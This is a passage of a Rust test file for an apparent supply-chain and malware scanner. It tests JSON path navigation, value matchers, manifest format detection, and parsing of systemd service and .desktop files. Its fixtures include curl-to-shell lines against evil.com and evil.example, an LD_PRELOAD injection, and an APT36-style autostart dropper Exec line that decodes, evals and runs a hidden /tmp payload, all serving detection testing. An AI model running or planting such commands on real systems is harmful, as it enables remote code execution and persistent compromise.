        let segments = parse_path("scripts.postinstall").unwrap();
        let values = navigate(&json, &segments);
        assert_eq!(values, vec![&json!("npm build")]);
    }

    #[test]
    fn test_navigate_missing_key() {
        let json = json!({"scripts": {}});
        let segments = parse_path("scripts.postinstall").unwrap();
        let values = navigate(&json, &segments);
        assert!(values.is_empty());
    }

    #[test]
    fn test_navigate_wildcard_expands() {
        let json = json!({
            "items": [
                {"name": "a"},
                {"name": "b"},
                {"name": "c"}
            ]
        });
        let segments = parse_path("items[*].name").unwrap();
        let values = navigate(&json, &segments);
        assert_eq!(values, vec![&json!("a"), &json!("b"), &json!("c")]);
    }

    #[test]
    fn test_navigate_object_wildcard_expands() {
        let json = json!({
            "dependencies": {
                "left-pad": "1.3.0",
                "tiny-lib": "https://example.invalid/tiny-lib.tgz"
            }
        });
        let segments = parse_path("dependencies.*").unwrap();
        let values = navigate(&json, &segments);
        assert!(values.contains(&&json!("1.3.0")));
        assert!(values.contains(&&json!("https://example.invalid/tiny-lib.tgz")));
    }

    #[test]
    fn test_navigate_index() {
        let json = json!({"items": ["a", "b", "c"]});
        let segments = parse_path("items[1]").unwrap();
        let values = navigate(&json, &segments);
        assert_eq!(values, vec![&json!("b")]);
    }

    #[test]
    fn test_navigate_index_out_of_bounds() {
        let json = json!({"items": ["a", "b"]});
        let segments = parse_path("items[5]").unwrap();
        let values = navigate(&json, &segments);
        assert!(values.is_empty());
    }

    #[test]
    fn test_navigate_wildcard_on_non_array() {
        let json = json!({"items": "not an array"});
        let segments = parse_path("items[*]").unwrap();
        let values = navigate(&json, &segments);
        assert!(values.is_empty());
    }

    // ==========================================================================
    // Matcher Tests
    // ==========================================================================

    #[test]
    fn test_exact_in_array() {
        let matcher = KvMatcher {
            exact: Some("debugger".to_string()),
            ..Default::default()
        };
        assert!(matcher.matches(&json!(["storage", "debugger", "tabs"])));
        assert!(!matcher.matches(&json!(["storage", "tabs"])));
    }

    #[test]
    fn test_exact_scalar() {
        let matcher = KvMatcher {
            exact: Some("document_start".to_string()),
            ..Default::default()
        };
        assert!(matcher.matches(&json!("document_start")));
        assert!(!matcher.matches(&json!("document_end")));
        assert!(!matcher.matches(&json!("document_start_extra")));
    }

    #[test]
    fn test_substr_scalar() {
        let matcher = KvMatcher {
            substr: Some("curl".to_string()),
            ..Default::default()
        };
        assert!(matcher.matches(&json!("curl http://evil.com | sh")));
        assert!(!matcher.matches(&json!("wget http://evil.com")));
    }

    #[test]
    fn test_substr_in_array() {
        let matcher = KvMatcher {
            substr: Some("amazon".to_string()),
            ..Default::default()
        };
        assert!(matcher.matches(&json!(["*://*.amazon.com/*", "*://*.ebay.com/*"])));
        assert!(!matcher.matches(&json!(["*://*.google.com/*"])));
    }

    #[test]
    fn test_regex_match() {
        let re = crate::composite_rules::condition::cached_regex(r"curl.*\|.*sh").unwrap();
        let matcher = KvMatcher {
            regex: Some(re),
            ..Default::default()
        };
        assert!(matcher.matches(&json!("curl http://evil.com | sh")));
        assert!(!matcher.matches(&json!("curl http://evil.com")));
    }

    #[test]
    fn test_regex_in_array() {
        let re = crate::composite_rules::condition::cached_regex(r"amazon|ebay").unwrap();
        let matcher = KvMatcher {
            regex: Some(re),
            ..Default::default()
        };
        assert!(matcher.matches(&json!(["*://*.amazon.com/*"])));
        assert!(matcher.matches(&json!(["*://*.ebay.com/*"])));
        assert!(!matcher.matches(&json!(["*://*.google.com/*"])));
    }

    #[test]
    fn test_case_insensitive_exact() {
        let matcher = KvMatcher {
            exact: Some("DEBUGGER".to_string()),
            case_insensitive: true,
            ..Default::default()
        };
        assert!(matcher.matches(&json!("debugger")));
        assert!(matcher.matches(&json!("DEBUGGER")));
        assert!(matcher.matches(&json!("Debugger")));
    }

    #[test]
    fn test_case_insensitive_substr() {
        let matcher = KvMatcher {
            substr: Some("curl".to_string()),
            case_insensitive: true,
            ..Default::default()
        };
        assert!(matcher.matches(&json!("CURL http://evil.com")));
        assert!(matcher.matches(&json!("Curl http://evil.com")));
    }

    #[test]
    fn test_existence_only() {
        let matcher = KvMatcher::default();
        assert!(matcher.matches(&json!("anything")));
        assert!(matcher.matches(&json!(null)));
        assert!(matcher.matches(&json!([])));
    }

    #[test]
    fn test_number_matching() {
        let matcher = KvMatcher {
            exact: Some("2".to_string()),
            ..Default::default()
        };
        assert!(matcher.matches(&json!(2)));
        assert!(matcher.matches(&json!("2")));
        assert!(!matcher.matches(&json!(3)));
    }

    #[test]
    fn test_boolean_matching() {
        let matcher = KvMatcher {
            exact: Some("true".to_string()),
            ..Default::default()
        };
        assert!(matcher.matches(&json!(true)));
        assert!(!matcher.matches(&json!(false)));
    }

    // ==========================================================================
    // Size Constraint Tests
    // ==========================================================================

    #[test]
    fn test_array_length_min() {
        let matcher = KvMatcher {
            length_min: Some(2),
            ..Default::default()
        };
        // Array with 3 elements should pass length_min: 2
        assert!(matcher.matches(&json!(["a", "b", "c"])));
        // Array with 1 element should fail length_min: 2
        assert!(!matcher.matches(&json!(["a"])));
        // Empty array should fail length_min: 2
        assert!(!matcher.matches(&json!([])));
    }

    #[test]
    fn test_array_length_max() {
        let matcher = KvMatcher {
            length_max: Some(2),
            ..Default::default()
        };
        // Array with 1 element should pass length_max: 2
        assert!(matcher.matches(&json!(["a"])));
        // Array with 2 elements should pass length_max: 2
        assert!(matcher.matches(&json!(["a", "b"])));
        // Array with 3 elements should fail length_max: 2
        assert!(!matcher.matches(&json!(["a", "b", "c"])));
    }

    #[test]
    fn test_string_length_bounds() {
        // len() of a string value is its byte length.
        let matcher = KvMatcher {
            length_min: Some(3),
            ..Default::default()
        };
        assert!(matcher.matches(&json!("abcd")));
        assert!(!matcher.matches(&json!("ab")));

        let matcher = KvMatcher {
            length_max: Some(3),
            ..Default::default()
        };
        assert!(matcher.matches(&json!("abc")));
        assert!(!matcher.matches(&json!("abcd")));

        // Non-string scalars have no len(): bounds never match them.
        let matcher = KvMatcher {
            length_min: Some(1),
            ..Default::default()
        };
        assert!(!matcher.matches(&json!(42)));
        assert!(!matcher.matches(&json!(true)));
        assert!(!matcher.matches(&serde_json::Value::Null));
    }

    #[test]
    fn test_array_size_exact() {
        let matcher = KvMatcher {
            length_min: Some(1),
            length_max: Some(1),
            ..Default::default()
        };
        // Exactly 1 element should pass
        assert!(matcher.matches(&json!(["single"])));
        // 0 elements should fail
        assert!(!matcher.matches(&json!([])));
        // 2 elements should fail
        assert!(!matcher.matches(&json!(["a", "b"])));
    }

    #[test]
    fn test_array_size_empty() {
        let matcher = KvMatcher {
            length_min: Some(0),
            length_max: Some(0),
            ..Default::default()
        };
        // Empty array should pass
        assert!(matcher.matches(&json!([])));
        // Non-empty array should fail
        assert!(!matcher.matches(&json!(["a"])));
    }

    #[test]
    fn test_object_length_min() {
        let matcher = KvMatcher {
            length_min: Some(2),
            ..Default::default()
        };
        // Object with 3 keys should pass length_min: 2
        assert!(matcher.matches(&json!({"a": 1, "b": 2, "c": 3})));
        // Object with 1 key should fail length_min: 2
        assert!(!matcher.matches(&json!({"a": 1})));
        // Empty object should fail length_min: 2
        assert!(!matcher.matches(&json!({})));
    }

    #[test]
    fn test_object_length_max() {
        let matcher = KvMatcher {
            length_max: Some(2),
            ..Default::default()
        };
        // Object with 1 key should pass length_max: 2
        assert!(matcher.matches(&json!({"a": 1})));
        // Object with 2 keys should pass length_max: 2
        assert!(matcher.matches(&json!({"a": 1, "b": 2})));
        // Object with 3 keys should fail length_max: 2
        assert!(!matcher.matches(&json!({"a": 1, "b": 2, "c": 3})));
    }

    #[test]
    fn test_object_size_empty() {
        let matcher = KvMatcher {
            length_max: Some(0),
            ..Default::default()
        };
        // Empty object should pass
        assert!(matcher.matches(&json!({})));
        // Non-empty object should fail
        assert!(!matcher.matches(&json!({"a": 1})));
    }

    #[test]
    fn test_length_on_scalar() {
        let matcher = KvMatcher {
            length_min: Some(1),
            ..Default::default()
        };
        // Strings have len() (byte length); other scalars do not and never
        // satisfy length bounds.
        assert!(matcher.matches(&json!("string")));
        assert!(!matcher.matches(&json!(123)));
        assert!(!matcher.matches(&json!(true)));
        assert!(!matcher.matches(&json!(null)));
    }

    #[test]
    fn test_size_with_string_matcher() {
        // Size constraint + string matching should both apply
        let matcher = KvMatcher {
            substr: Some("alice".to_string()),
            length_min: Some(1),
            length_max: Some(2),
            ..Default::default()
        };
        // Array with 1 element containing "alice" should pass
        assert!(matcher.matches(&json!(["alice@example.com"])));
        // Array with 2 elements containing "alice" should pass
        assert!(matcher.matches(&json!(["bob@example.com", "alice@example.com"])));
        // Array with 3 elements should fail (exceeds length_max)
        assert!(!matcher.matches(&json!([
            "alice@example.com",
            "bob@example.com",
            "charlie@example.com"
        ])));
        // Array with 1 element NOT containing "alice" should fail (string match fails)
        assert!(!matcher.matches(&json!(["bob@example.com"])));
    }

    // ==========================================================================
    // Exists Check Tests (via evaluate_kv)
    // ==========================================================================

    #[test]
    fn test_exists_false_match() {
        // exists: false should match when path does NOT exist
        let package_json = br#"{"name": "test", "version": "1.0.0"}"#;
        let path = Path::new("package.json");

        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "description".to_string(),
            exact: None,
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: Some(false),
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });

        // "description" doesn't exist, so exists: false should match
        assert!(evaluate_kv_test(&cond, package_json, path).is_some());
    }

    #[test]
    fn test_exists_false_no_match() {
        // exists: false should NOT match when path exists
        let package_json = br#"{"name": "test", "description": "A test"}"#;
        let path = Path::new("package.json");

        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "description".to_string(),
            exact: None,
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: Some(false),
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });

        // "description" exists, so exists: false should NOT match
        assert!(evaluate_kv_test(&cond, package_json, path).is_none());
    }

    #[test]
    fn test_exists_true_match() {
        // exists: true should match when path exists
        let package_json = br#"{"name": "test", "description": "A test"}"#;
        let path = Path::new("package.json");

        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "description".to_string(),
            exact: None,
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: Some(true),
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });

        // "description" exists, so exists: true should match
        assert!(evaluate_kv_test(&cond, package_json, path).is_some());
    }

    #[test]
    fn test_exists_true_no_match() {
        // exists: true should NOT match when path doesn't exist
        let package_json = br#"{"name": "test", "version": "1.0.0"}"#;
        let path = Path::new("package.json");

        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "description".to_string(),
            exact: None,
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: Some(true),
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });

        // "description" doesn't exist, so exists: true should NOT match
        assert!(evaluate_kv_test(&cond, package_json, path).is_none());
    }

    // ==========================================================================
    // Integration Tests for Size Constraints
    // ==========================================================================

    #[test]
    fn test_single_maintainer_detection() {
        let package_json = br#"{
            "name": "suspicious-package",
            "maintainers": [{"name": "single-author", "email": "author@gmail.com"}]
        }"#;
        let path = Path::new("package.json");

        // Exactly 1 maintainer
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "maintainers".to_string(),
            exact: None,
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: Some(1),
            length_max: Some(1),
            is_check: None,
            not: None,
        });

        assert!(evaluate_kv_test(&cond, package_json, path).is_some());
    }

    #[test]
    fn test_no_dependencies_detection() {
        let package_json = br#"{
            "name": "empty-package",
            "dependencies": {}
        }"#;
        let path = Path::new("package.json");

        // Empty dependencies object
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "dependencies".to_string(),
            exact: None,
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: Some(0),
            is_check: None,
            not: None,
        });

        assert!(evaluate_kv_test(&cond, package_json, path).is_some());
    }

    #[test]
    fn test_excessive_keywords_detection() {
        let keywords: Vec<String> = (0..35).map(|i| format!("keyword{}", i)).collect();
        let package_json = format!(
            r#"{{
            "name": "seo-spam-package",
            "keywords": {:?}
        }}"#,
            keywords
        );
        let path = Path::new("package.json");

        // 30+ keywords (SEO spam)
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "keywords".to_string(),
            exact: None,
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: Some(30),
            length_max: None,
            is_check: None,
            not: None,
        });

        assert!(evaluate_kv_test(&cond, package_json.as_bytes(), path).is_some());
    }

    // ==========================================================================
    // Format Detection Tests
    // ==========================================================================

    #[test]
    fn test_detect_known_json_manifests() {
        // Only known JSON manifest filenames are detected
        assert_eq!(
            detect_format(Path::new("manifest.json"), b""),
            StructuredFormat::Json
        );
        assert_eq!(
            detect_format(Path::new("package.json"), b""),
            StructuredFormat::Json
        );
        assert_eq!(
            detect_format(Path::new("package-lock.json"), b""),
            StructuredFormat::Json
        );
        assert_eq!(
            detect_format(Path::new("composer.json"), b""),
            StructuredFormat::Json
        );
    }

    #[test]
    fn test_detect_github_actions_workflow() {
        // GitHub Actions workflows in .github/workflows/ are detected
        assert_eq!(
            detect_format(Path::new(".github/workflows/ci.yaml"), b""),
            StructuredFormat::Yaml
        );
        assert_eq!(
            detect_format(Path::new(".github/workflows/test.yml"), b""),
            StructuredFormat::Yaml
        );
        assert_eq!(
            detect_format(
                Path::new("ci.yml"),
                b"name: CI\non:\n  push:\njobs:\n  test:\n    runs-on: ubuntu-latest"
            ),
            StructuredFormat::Yaml
        );
    }

    #[test]
    fn test_detect_known_toml_manifests() {
        // Known TOML manifests are detected
        assert_eq!(
            detect_format(Path::new("Cargo.toml"), b""),
            StructuredFormat::Toml
        );
        assert_eq!(
            detect_format(Path::new("pyproject.toml"), b""),
            StructuredFormat::Toml
        );
    }

    #[test]
    fn test_no_detection_for_unknown_json() {
        // Random JSON files without known filenames are not detected
        assert_eq!(
            detect_format(Path::new("unknown"), br#"{"key": "value"}"#),
            StructuredFormat::Unknown
        );
        assert_eq!(
            detect_format(Path::new("random.json"), b"[1, 2, 3]"),
            StructuredFormat::Unknown
        );
    }

    #[test]
    fn test_no_detection_for_unknown_yaml() {
        // Random YAML files without known filenames are not detected
        assert_eq!(
            detect_format(Path::new("unknown"), b"key: value\nother: 123"),
            StructuredFormat::Unknown
        );
        assert_eq!(
            detect_format(Path::new("config.yaml"), b"key: value"),
            StructuredFormat::Unknown
        );
        assert_eq!(
            detect_format(
                Path::new("config.yaml"),
                b"name: value\non: push\njobs_enabled: true"
            ),
            StructuredFormat::Unknown
        );
    }

    #[test]
    fn test_no_detection_for_unknown_toml() {
        // Random TOML files without known filenames are not detected
        assert_eq!(
            detect_format(Path::new("unknown"), b"[package]\nname = \"foo\""),
            StructuredFormat::Unknown
        );
        assert_eq!(
            detect_format(Path::new("config.toml"), b"key = \"value\""),
            StructuredFormat::Unknown
        );
    }

    // ==========================================================================
    // File Rejection Tests
    // ==========================================================================

    #[test]
    fn test_reject_random_json_files() {
        // Random .json files should not be parsed
        let json_content = br#"{"api_key": "secret123", "endpoint": "https://evil.com"}"#;

        // Random filenames with .json extension are rejected
        assert_eq!(
            detect_format(Path::new("config.json"), json_content),
            StructuredFormat::Unknown
        );
        assert_eq!(
            detect_format(Path::new("data.json"), json_content),
            StructuredFormat::Unknown
        );
        assert_eq!(
            detect_format(Path::new("settings.json"), json_content),
            StructuredFormat::Unknown
        );
        assert_eq!(
            detect_format(Path::new("/path/to/random.json"), json_content),
            StructuredFormat::Unknown
        );

        // Verify kv evaluation also returns None
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "api_key".to_string(),
            exact: Some("secret123".to_string()),
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });

        assert!(evaluate_kv_test(&cond, json_content, Path::new("random.json")).is_none());
        assert!(evaluate_kv_test(&cond, json_content, Path::new("config.json")).is_none());
    }

    #[test]
    fn is_validator_gates_a_value_condition() {
        // `is: random_like` on a value path is how document metadata is
        // judged -- a creator field holding a generated token rather than a
        // name. The validator has to run against the resolved value, not
        // just parse: with the gate unwired every value would pass.
        use crate::composite_rules::condition::StringValidator;
        // `Administrator` comes first on purpose: with the gate unwired the
        // condition matches on whatever it reaches first, so a test that put
        // the generated token first would pass either way.
        let json = br#"{"name":"p","authors":["Administrator","kwTfNTTv"]}"#;
        let build = |v: Option<StringValidator>| {
            Condition::Kv(KvQuery {
                match_mode: Default::default(),
                path: "authors[*]".to_string(),
                exact: None,
                substr: None,
                regex: None,
                eq: None,
                ne: None,
                case_insensitive: false,
                exists: None,
                length_min: None,
                length_max: None,
                is_check: v,
                not: None,
            })
        };
        let path = Path::new("package.json");

        // Without the validator the first value carries the match.
        let plain = evaluate_kv_test(&build(None), json, path).unwrap();
        assert!(plain.value.contains("Administrator"), "{}", plain.value);

        // With it, the name is skipped and only the generated token matches.
        let gated = evaluate_kv_test(&build(Some(StringValidator::RandomLike)), json, path)
            .expect("the generated token should still match");
        assert!(gated.value.contains("kwTfNTTv"), "{}", gated.value);
        assert!(!gated.value.contains("Administrator"), "{}", gated.value);

        // And where nothing is generated-looking, the condition must not
        // match at all rather than fall through to the first value.
        let names = br#"{"name":"p","authors":["Administrator","Kostenkontrolle"]}"#;
        assert!(
            evaluate_kv_test(&build(Some(StringValidator::RandomLike)), names, path).is_none(),
            "validator let an ordinary name through"
        );
    }

    #[test]
    fn not_exclusion_filters_a_matched_value() {
        // A `not:` on a value condition used to parse cleanly and then be
        // dropped, so the exception silently did nothing.
        let json_content = br#"{"name":"p","files": ["report.accreport.html", "index.html"]}"#;
        let build = |not: Option<Vec<crate::composite_rules::condition::NotException>>| {
            Condition::Kv(KvQuery {
                match_mode: Default::default(),
                path: "files[*]".to_string(),
                exact: None,
                substr: None,
                regex: Some(r"(?i)\.html?$".to_string()),
                eq: None,
                ne: None,
                case_insensitive: false,
                exists: None,
                length_min: None,
                length_max: None,
                is_check: None,
                not,
            })
        };
        let path = Path::new("package.json");
        let excluded = vec![crate::composite_rules::condition::NotException::Structured(
            crate::composite_rules::condition::NotExceptionStructured {
                exact: None,
                substr: None,
                regex: Some(r"(?i)accreport\.html?$".to_string()),
                lowered_substr: None,
            },
        )];

        assert!(evaluate_kv_test(&build(None), json_content, path).is_some());
        // `index.html` still matches, so the condition holds -- but the
        // excluded name must not be what carries it.
        let ev = evaluate_kv_test(&build(Some(excluded)), json_content, path).unwrap();
        assert!(
            !ev.value.contains("accreport"),
            "excluded value: {}",
            ev.value
        );
    }

    #[test]
    fn test_reject_random_yaml_files() {
        // Random .yaml/.yml files should not be parsed
        let yaml_content = b"database:\n  host: localhost\n  password: secret";

        // Random YAML files are rejected
        assert_eq!(
            detect_format(Path::new("config.yaml"), yaml_content),
            StructuredFormat::Unknown
        );
        assert_eq!(
            detect_format(Path::new("docker-compose.yml"), yaml_content),
            StructuredFormat::Unknown
        );
        assert_eq!(
            detect_format(Path::new("settings.yml"), yaml_content),
            StructuredFormat::Unknown
        );

        // Verify kv evaluation returns None
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "database.password".to_string(),
            exact: Some("secret".to_string()),
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });

        assert!(evaluate_kv_test(&cond, yaml_content, Path::new("config.yaml")).is_none());
    }

    #[test]
    fn test_reject_random_toml_files() {
        // Random .toml files should not be parsed
        let toml_content = b"[database]\nhost = \"localhost\"\npassword = \"secret\"";

        // Random TOML files are rejected
        assert_eq!(
            detect_format(Path::new("config.toml"), toml_content),
            StructuredFormat::Unknown
        );
        assert_eq!(
            detect_format(Path::new("settings.toml"), toml_content),
            StructuredFormat::Unknown
        );
        assert_eq!(
            detect_format(Path::new("app.toml"), toml_content),
            StructuredFormat::Unknown
        );

        // Verify kv evaluation returns None
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "database.password".to_string(),
            exact: Some("secret".to_string()),
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });

        assert!(evaluate_kv_test(&cond, toml_content, Path::new("config.toml")).is_none());
    }

    #[test]
    fn test_accept_known_json_manifests() {
        // Known JSON manifests should still be parsed
        let package_json = br#"{"name": "malicious-package", "version": "1.0.0"}"#;
        let manifest_json = br#"{"manifest_version": 2, "permissions": ["storage"]}"#;
        let composer_json = br#"{"name": "vendor/package", "require": {}}"#;

        // Verify detection works
        assert_eq!(
            detect_format(Path::new("package.json"), package_json),
            StructuredFormat::Json
        );
        assert_eq!(
            detect_format(Path::new("manifest.json"), manifest_json),
            StructuredFormat::Json
        );
        assert_eq!(
            detect_format(Path::new("composer.json"), composer_json),
            StructuredFormat::Json
        );

        // Verify kv evaluation works
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "name".to_string(),
            exact: Some("malicious-package".to_string()),
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });

        assert!(evaluate_kv_test(&cond, package_json, Path::new("package.json")).is_some());
    }

    #[test]
    fn test_accept_known_toml_manifests() {
        // Known TOML manifests should still be parsed
        let cargo_toml = b"[package]\nname = \"malicious-crate\"\nversion = \"0.1.0\"";
        let pyproject_toml = b"[project]\nname = \"malicious-package\"\nversion = \"1.0.0\"";

        // Verify detection works
        assert_eq!(
            detect_format(Path::new("Cargo.toml"), cargo_toml),
            StructuredFormat::Toml
        );
        assert_eq!(
            detect_format(Path::new("pyproject.toml"), pyproject_toml),
            StructuredFormat::Toml
        );

        // Verify kv evaluation works
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "package.name".to_string(),
            exact: Some("malicious-crate".to_string()),
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });

        assert!(evaluate_kv_test(&cond, cargo_toml, Path::new("Cargo.toml")).is_some());
    }

    #[test]
    fn test_accept_github_actions_workflows() {
        // GitHub Actions workflows should be parsed
        let workflow = b"name: CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest";

        // Both .yml and .yaml in .github/workflows/ should work
        assert_eq!(
            detect_format(Path::new(".github/workflows/ci.yml"), workflow),
            StructuredFormat::Yaml
        );
        assert_eq!(
            detect_format(Path::new(".github/workflows/test.yaml"), workflow),
            StructuredFormat::Yaml
        );

        // Non-workflow locations still work if the YAML has workflow structure.
        assert_eq!(
            detect_format(Path::new(".github/ci.yml"), workflow),
            StructuredFormat::Yaml
        );
        assert_eq!(
            detect_format(Path::new("ci.yml"), workflow),
            StructuredFormat::Yaml
        );

        // Verify kv evaluation works for workflows
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "name".to_string(),
            exact: Some("CI".to_string()),
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });

        assert!(evaluate_kv_test(&cond, workflow, Path::new(".github/workflows/ci.yml")).is_some());
        assert!(evaluate_kv_test(&cond, workflow, Path::new("ci.yml")).is_some());
    }

    #[test]
    fn test_reject_json_with_valid_content_but_wrong_filename() {
        // Even if content is valid JSON, reject if filename is unknown
        let valid_json = br#"{"perfectly": "valid", "json": true}"#;

        assert_eq!(
            detect_format(Path::new("database.json"), valid_json),
            StructuredFormat::Unknown
        );
        assert_eq!(
            detect_format(Path::new("api-config.json"), valid_json),
            StructuredFormat::Unknown
        );

        // Verify kv evaluation doesn't work
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "perfectly".to_string(),
            exact: Some("valid".to_string()),
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });

        assert!(evaluate_kv_test(&cond, valid_json, Path::new("database.json")).is_none());
    }

    #[test]
    fn test_case_insensitive_filename_matching() {
        // Filenames should be matched case-insensitively
        let json_content = br#"{"test": "value"}"#;

        assert_eq!(
            detect_format(Path::new("Package.json"), json_content),
            StructuredFormat::Json
        );
        assert_eq!(
            detect_format(Path::new("PACKAGE.JSON"), json_content),
            StructuredFormat::Json
        );
        assert_eq!(
            detect_format(Path::new("Manifest.JSON"), json_content),
            StructuredFormat::Json
        );

        let toml_content = b"[package]\nname = \"test\"";
        assert_eq!(
            detect_format(Path::new("cargo.TOML"), toml_content),
            StructuredFormat::Toml
        );
        assert_eq!(
            detect_format(Path::new("PyProject.toml"), toml_content),
            StructuredFormat::Toml
        );
    }

    #[test]
    fn test_detect_systemd_service_files() {
        let service = b"[Unit]\nDescription=Updater\n[Service]\nExecStart=/bin/true\n";
        assert_eq!(
            detect_format(Path::new("evil.service"), service),
            StructuredFormat::SystemdService
        );
        assert_eq!(
            detect_format(
                Path::new("/etc/systemd/system/ssh.service.d/override.conf"),
                service
            ),
            StructuredFormat::SystemdService
        );
    }

    #[test]
    fn test_parse_systemd_service_structure() {
        let service = br#"
# leading comment
[Unit]
Description=Updater
After=network-online.target auditd.service

[Service]
Type=simple
Environment="LD_PRELOAD=/tmp/evil.so" "URL=https://evil.example/payload.sh"
ExecStart=/bin/old
ExecStart=
ExecStart=/bin/bash -c \
# comment in continued block should be ignored
  curl -fsSL https://evil.example/payload.sh | sh
ExecStartPre=/usr/bin/test -x /bin/bash
ReadWritePaths=/etc/systemd/system /tmp

[Install]
WantedBy=multi-user.target graphical.target
"#;

        let parsed = parse_systemd_service(service).expect("systemd service should parse");

        let exec_start = navigate(&parsed, &parse_path("service.exec_start").unwrap());
        assert_eq!(exec_start.len(), 1);
        assert_eq!(
            exec_start[0],
            &json!("/bin/bash -c curl -fsSL https://evil.example/payload.sh | sh")
        );

        let exec_start_pre = navigate(&parsed, &parse_path("service.exec_start_pre").unwrap());
        assert_eq!(exec_start_pre, vec![&json!("/usr/bin/test -x /bin/bash")]);

        let env_var = navigate(
            &parsed,
            &parse_path("service.environment.LD_PRELOAD").unwrap(),
        );
        assert_eq!(env_var, vec![&json!("/tmp/evil.so")]);

        let after = navigate(&parsed, &parse_path("unit.after").unwrap());
        assert_eq!(
            after,
            vec![&json!(["network-online.target", "auditd.service"])]
        );

        let wanted_by = navigate(&parsed, &parse_path("install.wanted_by").unwrap());
        assert_eq!(
            wanted_by,
            vec![&json!(["multi-user.target", "graphical.target"])]
        );

        let read_write_paths = navigate(&parsed, &parse_path("service.read_write_paths").unwrap());
        assert_eq!(
            read_write_paths,
            vec![&json!(["/etc/systemd/system", "/tmp"])]
        );
    }

    #[test]
    fn test_parse_desktop_entry_benign() {
        // Realistic small benign .desktop file (RustDesk)
        let content = br#"[Desktop Entry]
Name=RustDesk
GenericName=Remote Desktop
Comment=Remote Desktop
Exec=rustdesk %u
Icon=rustdesk
Terminal=false
Type=Application
StartupNotify=true
Categories=Network;RemoteAccess;GTK;
Keywords=internet;linux;dart;rust;remote-control;p2p;teamviewer;rust-lang;rdp;remote-desktop;vnc;
Actions=new-window;

[Desktop Action new-window]
Name=Open a New Window
Exec=rustdesk %u
"#;

        let parsed = parse_desktop_entry(content).expect("desktop entry should parse");

        let exec = navigate(&parsed, &parse_path("desktop_entry.exec").unwrap());
        assert_eq!(exec, vec![&json!("rustdesk %u")]);

        let entry_type = navigate(&parsed, &parse_path("desktop_entry.type").unwrap());
        assert_eq!(entry_type, vec![&json!("Application")]);

        let terminal = navigate(&parsed, &parse_path("desktop_entry.terminal").unwrap());
        assert_eq!(terminal, vec![&json!("false")]);

        // Categories is a `;`-separated list → stored as array
        let categories = navigate(&parsed, &parse_path("desktop_entry.categories").unwrap());
        assert_eq!(categories, vec![&json!(["Network", "RemoteAccess", "GTK"])]);

        // Secondary section is accessible
        let action_exec = navigate(
            &parsed,
            &parse_path("desktop_action_new_window.exec").unwrap(),
        );
        assert_eq!(action_exec, vec![&json!("rustdesk %u")]);
    }

    #[test]
    fn test_parse_desktop_entry_apt36_dropper() {
        // Pattern modeled on the APT36 weaponized .desktop autostart dropper
        // (CYFIRMA APT36 BOSS-Linux campaign): inline bash -c with base64-decoded
        // payload, X-GNOME-Autostart-enabled=true, misleading pdf icon.
        let content = br#"
# fake embedded thumbnail data
# iVBORw0KGgrhR6fHOI+odJY
[Desktop Entry]
Name=Contract_for_Procurement
Exec=bash -c 'f(){ echo "$1"|base64 -d|xxd -r -p|base64 -d; }; p="/tmp/.a-$(date +%s%N|md5sum|cut -c1-8)"; v="$(f NTQ0NT==)"; (eval "$v" > "$p" 2>/dev/null && chmod +x "$p" 2>/dev/null && "$p") &'
Terminal=false
Type=Application
Icon=application-pdf
Categories=Utility;
X-GNOME-Autostart-enabled=true
X-KDE-SubstituteUID=false
X-KDE-Username=root
"#;

        let parsed = parse_desktop_entry(content).expect("malicious desktop entry should parse");

        // Exec value is fully preserved for trait matching on bash -c / base64 / eval / chmod
        let exec = navigate(&parsed, &parse_path("desktop_entry.exec").unwrap());
        assert_eq!(exec.len(), 1);
        let exec_str = exec[0].as_str().expect("exec is string");
        assert!(exec_str.contains("bash -c"));
        assert!(exec_str.contains("base64 -d"));
        assert!(exec_str.contains("eval"));
